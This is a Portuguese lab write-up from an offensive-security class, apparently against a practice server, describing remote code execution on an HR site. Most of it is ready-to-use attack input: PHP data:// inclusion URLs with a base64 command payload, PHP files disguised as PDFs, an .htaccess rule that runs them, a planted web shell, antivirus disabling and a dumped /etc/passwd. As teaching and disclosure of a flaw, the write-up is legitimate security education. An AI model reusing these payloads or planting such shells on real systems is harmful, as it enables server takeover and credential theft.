# 🔍 Exploração de Vuln — 👨‍🔬 Penetratium ☢️ - 🧬 Team 📡

## 📘 Matéria: Segurança Ofensiva  

- 👨‍🏫 **Professor:** JPGress  
- 🕳️ **Tema:** Shell Reversa  

---

## 📜 Roteiro da Atividade  

- Identificar o IP da máquina alvo.  
- Desativar o antivírus da máquina.  
- Baixar o Netcat (NC) para Windows (no meu caso, devido a instabilidade da máquina).  
- Configurar o listener em um lado e enviar o sinal do outro.  
- Enviar o sinal pela URL ou realizar upload de um arquivo malicioso.  
- Executar o arquivo e receber a conexão reversa.  

---

# 🛡️ Desativando o Antivírus  
<p align="center">
  <img width="319" height="265" alt="image" src="https://github.com/user-attachments/assets/3f997066-36e2-418d-a67a-3317880f0224" />
</p>

<p align="center">
  <img width="589" height="982" alt="image" src="https://github.com/user-attachments/assets/ab971d68-deb8-46b2-b6e8-5791407107f9" />
</p>

---

# 💾 Baixando o Netcat (Windows)
<p align="center">
  <img width="383" height="332" alt="image" src="https://github.com/user-attachments/assets/b313b975-e39f-4e95-96be-c41b3380d39b" />
</p>

# 🔗 Link para download: [Netcat - GitHub](https://github.com/diegocr/netcat/blob/master/nc.exe)  

<p align="center">
  <img width="522" height="512" alt="image" src="https://github.com/user-attachments/assets/e76a7de6-f0a2-494e-ac38-2a156713142f" />
</p>

---

## 📂 Descoberta do Banco de Dados  

Foi identificado o diretório da aplicação que armazena os **uploads de currículos**.  
Com isso, é possível enviar arquivos maliciosos (.pdf) e executá-los no servidor.  

🔗 Teste inicial:  
```
http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=ls%20-la%20/var/www/html/uploads
```

📌 Confirmação: Banco de dados e diretório de uploads identificado.  

---

## 📤 Upload de Arquivo TESTE(.pdf)

Comando para envio do arquivo TESTE:  
```
http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=echo%20%27%25PDF-1.4%0A%25%E2%E3%CF%D3%0A%0A%3C?php%20echo%20%22TESTE%20FUNCIONOU%22%3B%20%3F%3E%27%20%3E%20%2Fvar%2Fwww%2Fhtml%2Fuploads%2Fteste.pdf
```

📌 Verificação:  
🔗 [http://rh.businesscorp.com.br/uploads/teste.pdf](http://rh.businesscorp.com.br/uploads/teste.pdf)  

<p align="center">
  <img width="477" height="83" alt="image" src="https://github.com/user-attachments/assets/16a55f59-ce69-440a-b049-861819f3f9fe" />
</p>

---

## ⚙️ Criação do `.htaccess`  

Arquivo necessário para permitir a execução de **.pdf** como PHP:  

```
http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=echo%20%27AddType%20application%2Fx-httpd-php%20.pdf%27%20>%20%2Fvar%2Fwww%2Fhtml%2Fuploads%2F.htaccess
```

🔑 Ajustando permissões:  
```
http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=chmod%20777%20/var/www/html/uploads/.htaccess
```

📌 Resposta :  
```
    -rwxrwxrwx  1 www-data www-data    37 Sep 19 08:57 .htaccess

```

---

## 📥 Upload de um Prompt de Comando  

Comando utilizado para envio do **cmd.pdf**:  
```

    ** conteudo do cmd: <?php system($_GET['cmd']); ?> **

envio desse conteudo:

http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=echo%20'%25PDF-1.4%0A%25%E2%E3%CF%D3%0A%0A%3C?php%20echo%20%22%3Cform%20method%3DGET%3E%3Cinput%20type%3Dtext%20name%3Dcmd%20placeholder%3DDigite%20um%20comando%3E%3Cinput%20type%3Dsubmit%20value%3DExecutar%3E%3C%2Fform%3E%3Cpre%3E%22%3B%20if(isset(%24_GET%5B%22cmd%22%5D))%20%7B%20system(%24_GET%5B%22cmd%22%5D)%3B%20%7D%20echo%20%22%3C%2Fpre%3E%22%3B%20%3F%3E'%20%3E%20%2Fvar%2Fwww%2Fhtml%2Fuploads%2Fcmd.pdf
```

🔗 Acesso ao arquivo: http://rh.businesscorp.com.br/uploads/cmd.pdf 

<p align="center">
  <img width="488" height="132" alt="image" src="https://github.com/user-attachments/assets/ab571ec0-a668-4244-98ab-ffc7f5c209ec" />
</p>

📌 O prompt foi criado com sucesso.  

---

## 🔑 Ajustando Permissões do Prompt

🔗 Comando para aplicar permissões:  
```
http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=chmod%20777%20/var/www/html/uploads/cmd.pdf
```

- Antes:  
<p align="center">
  <img width="364" height="117" alt="image" src="https://github.com/user-attachments/assets/8ff534bb-acc2-4de0-ae18-bfdf4858ec9d" />
</p>

- Depois:  
<p align="center">
  <img width="430" height="163" alt="image" src="https://github.com/user-attachments/assets/f9528674-fdc2-40a8-a4e3-e33de04431b5" />
</p>

---

## ✍️ Mensagem Ética

Para assegurar que a atividade foi apenas acadêmica, foi deixada a seguinte mensagem no servidor:  

```
echo "Olá, meu nome é Luan. Não sou um hacker mal-intencionado, sou apenas um estudante da Faculdade IESGO.  
Meu GitHub é https://github.com/Luanqmata. Caso alguém encontre este arquivo, saiba que não tenho más intenções.  
Trata-se apenas de uma atividade acadêmica.  
Contato: calazanscybersec@gmail.com" > hacked_by_luan.txt
```

<p align="center">
  <img width="284" height="135" alt="image" src="https://github.com/user-attachments/assets/7bc73941-7650-47a3-a4b0-c9cc03927e7e" />
</p>

---

- Agora vamos descobrir o caminho do /bash comando : which bash

```
  comando para apagar arquivos criados : rm /var/www/html/nome_arquivo.php ( cuidado )
  /bin/bash

```

- Criação do arquivo de prompt comando no caminho : /var/www/html
```
  http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=echo%20'%3C?php%20echo%20%22%3Cform%20method%3DGET%3E%3Cinput%20type%3Dtext%20name%3Dcmd%20placeholder%3DDigite%20um%20comando%3E%3Cinput%20type%3Dsubmit%20value%3DExecutar%3E%3C/form%3E%3Cpre%3E%22%3B%20if(isset(%24_GET%5B%22cmd%22%5D))%20%7B%20system(%24_GET%5B%22cmd%22%5D)%3B%20%7D%20echo%20%22%3C/pre%3E%22%3B%20%3F%3E'%20%3E%20/var/www/html/web_shell.php

permissão: http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=chmod%20777%20/var/www/html/web_shell.php

caminho : http://rh.businesscorp.com.br/web_shell.php

```
<p align="center">
  <img width="526" height="442" alt="image" src="https://github.com/user-attachments/assets/14fc622f-5f4d-4596-862b-21f8bb10184a" />
</p>

- Com tudo montadinho certo ,era só executar a shell mas parece que maquina esta em uma rede diferente e ela nao alcança minhas maquinas para o shell reverso!

<p align="center">
  <img width="496" height="158" alt="image" src="https://github.com/user-attachments/assets/11aa8f93-6f35-4c36-9f44-0511c6209e8a" />
</p>


<p align="center">
  <img width="471" height="149" alt="image" src="https://github.com/user-attachments/assets/d8e5427b-2d70-41b0-9b5c-b7c1d74dfb66" />
</p>

- Infelizmente o shell revese não vai rolar , mas é possivel pegar o /etc/passwd e /etc/shadow depois que escalamos o previlegio do arquivo web_shell.sh

- Arquivo etc/passwd:
```
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    libuuid:x:100:101::/var/lib/libuuid:
    syslog:x:101:104::/home/syslog:/bin/false
    mysql:x:102:106:MySQL Server,,,:/nonexistent:/bin/false
    messagebus:x:103:107::/var/run/dbus:/bin/false
    landscape:x:104:110::/var/lib/landscape:/bin/false
    sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
    business:x:1000:1000:business,,,:/home/business:/bin/bash

```


---

## ⚠️ Conclusão

Foi identificado que o servidor:  
- Permite **upload e execução de arquivos maliciosos**.  
- Permite alteração de **permissões de arquivos,criar arquivos , apagar arquivos**.  
- Apresenta uma falha crítica de **Remote Code Execution (RCE)**.  

🚨 Esta vulnerabilidade é extremamente grave e possibilita **comprometimento total do sistema**.  

